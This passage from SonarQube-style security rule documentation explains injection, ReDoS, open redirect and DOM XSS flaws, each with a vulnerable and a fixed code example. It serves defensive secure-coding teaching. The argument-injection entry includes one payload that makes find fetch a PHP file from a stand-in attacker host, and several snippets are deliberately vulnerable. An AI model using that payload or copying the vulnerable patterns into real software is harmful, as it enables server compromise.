<p>In languages that don’t enforce memory access checks, this can also lead to a buffer overflow or underflow which may result in sensitive
information disclosure or remote code execution.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of service</h4>
<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Even if the denial of service has little direct impact, it can cause secondary effects in architectures that use containers and container
orchestrators. It could cause unexpected container failures or resource overconsumption, for example.</p>
<h4>Infrastructure SPOFs</h4>
<p>A denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
def example():
    limit = int(request.args.get('limit'))

    for _ in range(limit):
        # ...
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
def example():
    limit = int(request.args.get('limit'))
    restricted_limit = min(10, limit)

    for _ in range(restricted_limit):
        # ...
</pre>
<h3>How does this work?</h3>
<h4>Set limits</h4>
<p>Validate loop variable values to ensure they fall within the expected bounds. If a value falls outside of these bounds, reject it as invalid or
adjust it to bring it within bounds. This guarantees that the loop will only iterate over the expected number of elements or perform the expected
number of iterations.</p>
<p>Do not assume that users will provide sensible values. Attackers intentionally choose unusual values to cause the system to misbehave.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/606">CWE-606 - Unchecked Input for Loop Condition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2091">
              pythonsecurity:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
<h2>How to fix it in lxml</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to XPath injection because untrusted data is concatenated to an XPath query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
from lxml import etree

@app.route('/authenticate')
def authenticate():
    username = request.args['username']
    password = request.args['password']
    expression = "./users/user[@name='" + username + "' and @pass='" + password + "']"
    tree = etree.parse('resources/users.xml')

    if tree.find(expression) is None:
        return "Invalid credentials", 401
    else:
        return "Success", 200
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
from lxml import etree

@app.route('/authenticate')
def authenticate():
    username = request.args['username']
    password = request.args['password']
    expression = "./users/user[@name=$username and @pass=$password]"
    tree = etree.parse('resources/users.xml')

    if tree.xpath(expression, username=username, password=password) is None:
        return "Invalid credentials", 401
    else:
        return "Success", 200
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Parameterized Queries</h4>
<p>For XPath injections, the cleanest way to do so is to use parameterized queries.</p>
<p>XPath allows for the usage of variables inside expressions in the form of <code>$variable</code>. XPath variables can be used to construct an XPath
query without needing to concatenate user arguments to the query at runtime. Here is an example of an XPath query with variables:</p>
<pre>
/users/user[@user=$user and @pass=$pass]
</pre>
<p>When the XPath query is executed, the user input is passed alongside it. During execution, when the values of the variables need to be known, a
resolver will return the correct user input for each variable. The contents of the variables are not considered application logic by the XPath
executor, and thus injection is not possible.</p>
<p>In the example, the username and password are passed as <a
href="https://lxml.de/xpathxslt.html#:~:text=The%20xpath()%20method%20has%20support%20for%20XPath%20variables%3A">XPath variables</a> rather than
concatenated to the XPath query. By using a parameterized query, injection is successfully prevented.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/643">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S2631">
              tssecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const express = require('express');

const app = express();

app.get('/lookup', (req, res) =&gt; {
  const regex = RegExp(req.query.regex); // Noncompliant

  if(regex.test(req.query.data)){
    res.send("It's a Match!");
  }else{
    res.send("Not a Match!");
  }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const express = require('express');
const escapeStringRegexp = require('escape-string-regexp');

const app = express();

app.get('/lookup', (req, res) =&gt; {
  const regex = RegExp(escapeStringRegexp(req.query.regex));

  if(regex.test(req.query.data)){
    res.send("It's a Match!");
  }else{
    res.send("Not a Match!");
  }
})
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2">re2</a>.</p>
<p>In the compliant solution, the <code>escapeStringRegexp</code> function provided by the npm package <code>escape-string-regexp</code> escapes
metacharacters and escape sequences that could have broken the initially intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5883">
              tssecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
async function (req, res) {
    await execa.command('find /tmp/images/' + req.query.id); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
async function (req, res) {
    if (req.query.file &amp;&amp; req.query.file.match(/^[A-Z]+$/i)) {
        await execa('find', ['/tmp/images/' + req.query.file]);
    } else {
        await execa('find', ['/tmp/images/']);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>When this is not possible, strict measures should be applied to ensure a secure implementation.</p>
<p>The proposed compliant solution makes use of the <code>execa</code> method. This one separates the command to run from the arguments passed to it.
It also ensures that all arguments passed to the executed command are properly escaped. That way, an attacker with control over a command parameter
will not be able to inject arbitrary new ones.</p>
<p>While this reduces the chances for an attacker to identify an exploitation payload, the highest security level will only be reached by adding an
additional validation layer.</p>
<p>In the current example, an attacker with control over the first parameter of the <code>find</code> command could still be able to inject special
file path characters in it. Indeed, passing <code>../../</code> string as a parameter would force the <code>find</code> command to crawl the whole
file system. This could lead to a denial of service or sensitive data exposure.</p>
<p>Here, adding a regular-expression-based validation on the user-controled value prevents this kind of issue. It ensures that the user-submitted
parameter contains a harmless value.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li>
  <li> <a href="https://gtfobins.github.io/#+shell">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>
  <li> <a href="https://lolbas-project.github.io/#">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5146">
              tssecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
server.get('/redirect', (request, response) =&gt; {

   response.redirect(request.query.url); // Noncompliant
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
server.get('/redirect', (request, response) =&gt; {

   if (request.query.url.startsWith("https://www.example.com/")) {
      response.redirect(request.query.url);
   }
});
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol>
  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>
  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>
  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>
</ol>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/601">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5696">
              tssecurity:S5696
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>DOM-based cross-site scripting (XSS) occurs in a web application when its client-side logic reads user-controllable data, such as the URL, and then
uses this data in dangerous functions defined by the browser, such as <code>eval()</code>, without sanitizing it first.</p>
<p>When well-intentioned users open a link to a page vulnerable to DOM-based XSS, they are exposed to several attacks targeting their browsers.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but also arbitrary code that can
be interpreted by the user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting this vulnerability.</p>
<h4>Website defacement</h4>
<p>An attacker can use the vulnerability to change the target web application’s content as they see fit. Therefore, they might replace the website’s
original content with inappropriate content, leading to brand and reputation damage for the web application owner. It could additionally be used in
phishing campaigns, leading to the potential loss of user credentials.</p>
<h4>User impersonation</h4>
<p>When a user is logged into a web application and opens a malicious link, the attacker can steal that user’s web session and carry out unauthorized
actions on their account. If the credentials of a privileged user (such as an administrator) are stolen, the attacker might be able to compromise all
of the web application’s data.</p>
<h4>Theft of sensitive data</h4>
<p>Cross-site scripting allows an attacker to extract the application data of any user that opens their malicious link. Depending on the application,
this can include sensitive data such as financial or health information. Furthermore, by injecting malicious code into the web application, it might
be possible to record keyboard activity (keylogger) or even request access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers can use cross-site scripting vulnerabilities as a first step to exploit more dangerous
vulnerabilities.</p>
<p>For example, suppose that the admin control panel of a web application contains an SQL injection vulnerability. In this case, an attacker could
find an XSS vulnerability and send a malicious link to an administrator. Once the administrator opens the link, the SQL injection is exploited, giving
the attacker access to all user data stored in the web application.</p>
<h2>How to fix it in DOM API</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to DOM-based cross-site scripting because it uses unsanitized URL parameters to alter the DOM of its webpage.</p>
<p>Because the user input is not sanitized here and the used DOM property is vulnerable to XSS, it is possible to inject arbitrary code in the user’s
browser through this example.</p>
<h4>Noncompliant code example</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML"><code>Element.innerHTML</code></a> property is used to replace the
contents of the <code>root</code> element with user-supplied contents. The <code>innerHTML</code> property does not sanitize its input, thus allowing
for code injection.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const rootEl = document.getElementById('root');
const queryParams = new URLSearchParams(document.location.search);
const input = queryParams.get("input");

rootEl.innerHTML = input; // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText"><code>HTMLElement.innerText</code></a> property does not
create DOM elements out of its input, rather treating its input as a string. This makes it a safe alternative to <code>Element.innerHTML</code>
depending on the use case.</p>
<pre data-diff-id="1" data-diff-type="compliant">
const rootEl = document.getElementById('root');
const queryParams = new URLSearchParams(document.location.search);
const input = queryParams.get("input");

rootEl.innerText = input;
</pre>
<h3>How does this work?</h3>
<p>In general, one should limit the use of dangerous properties and methods, such as <code>Element.innerHTML</code> or <code>Document.write()</code>,
as there exist many ways for an attacker to exploit their usage. Instead, prefer the usage of safe alternatives such as
<code>HTMLElement.innerText</code> or <code>Node.textContent</code>. Furthermore, frameworks such as React or Vue.js will automatically escape
variables used in views, making it much harder to accidentally write vulnerable code.</p>
<p>If these options are not possible, sanitization of the attacker-controllable input should be preferred.</p>
<h4>Sanitization of user-supplied data</h4>
<p>By systematically encoding data that is written to the DOM, it is possible to prevent XSS attacks. In this case, the goal is to leave the data
intact from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>However, selecting an encoding that is guaranteed to be safe can be a complex task. XSS exploitation techniques vary depending on the HTML context
where malicious input is injected. As a result, a combination of HTML encoding, URL encoding and JavaScript escaping may be required, depending on the
context. <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">OWASP’s DOM-based XSS Prevention Cheat
Sheet</a> goes into more detail about the required sanitization.</p>
<p>Though browsers do not yet provide any direct API to do this sanitization, the <a href="https://github.com/cure53/DOMPurify">DOMPurify library</a>
offers extensive functionality to prevent XSS and has been tested by a large user base.</p>
<h3>Pitfalls</h3>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>For example, filtering out user inputs based on a denylist will never fully prevent XSS vulnerabilities from being exploited. This practice is
sometimes used by web application firewalls. Time and time again, malicious users are able to find the exploitation payload that will defeat the
filters of these firewalls.</p>
<p>Another common approach is to parse HTML and strip sensitive HTML tags. Again, this denylist approach is vulnerable by design: maintaining a list
of sensitive HTML tags is very difficult in the long run.</p>
<h4>Modification after sanitization</h4>
<p>Caution should be taken if the user-supplied data is further modified <strong>after</strong> this data was sanitized. Doing so might void the
effects of sanitization and introduce new XSS vulnerabilities. In general, modification of this data should occur beforehand instead.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy</h4>
<p>With a defense-in-depth security approach, a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> (CSP) can
be added through the <code>Content-Security-Policy</code> HTTP header, or using a <code>&lt;meta&gt;</code> element. The CSP aims to mitigate XSS
attacks by instructing client browsers not to load data that does not meet the application’s security requirements.</p>
<p>Server administrators can define an allowlist of domains that contain valid scripts, which will prevent malicious scripts (not stored on one of
these domains) from being executed. If script execution is not needed on a certain webpage, it can also be blocked altogether.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href="http://www.webappsec.org/projects/articles/071105.shtml">webappsec.org</a> - DOM Based Cross Site Scripting or XSS of the Third Kind
  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.sonarsource.com/blog/ghost-admin-takeover/">Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S2076">
              tssecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const { execSync } = require('child_process')

cmd = req.query.cmd
execSync(cmd) // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const { spawnSync } = require('child_process')

const cmdId = parseInt(req.query.cmdId)
let host = req.query.host
host = typeof host === "string"? host : "example.org"

const allowedCommands = [
    {exe:"/bin/ping", args:["-c","1","--"]},
    {exe:"/bin/host", args:["--"]}
]
const cmd = allowedCommands[cmdId]
spawnSync(cmd.exe, cmd.args.concat(host))
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<p>In the example compliant code, a static list of trusted commands is used. Users are only allowed to submit an index in this array in place of a
full command name.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>child_process.spawn</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul>
  <li> <code>&amp;</code> </li>
  <li> <code>|</code> </li>
  <li> <code>;</code> </li>
  <li> <code>$</code> </li>
  <li> <code>&gt;</code> </li>
  <li> <code>&lt;</code> </li>
  <li> <code>`</code> </li>
  <li> <code>\</code> </li>
  <li> <code>!</code> </li>
</ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
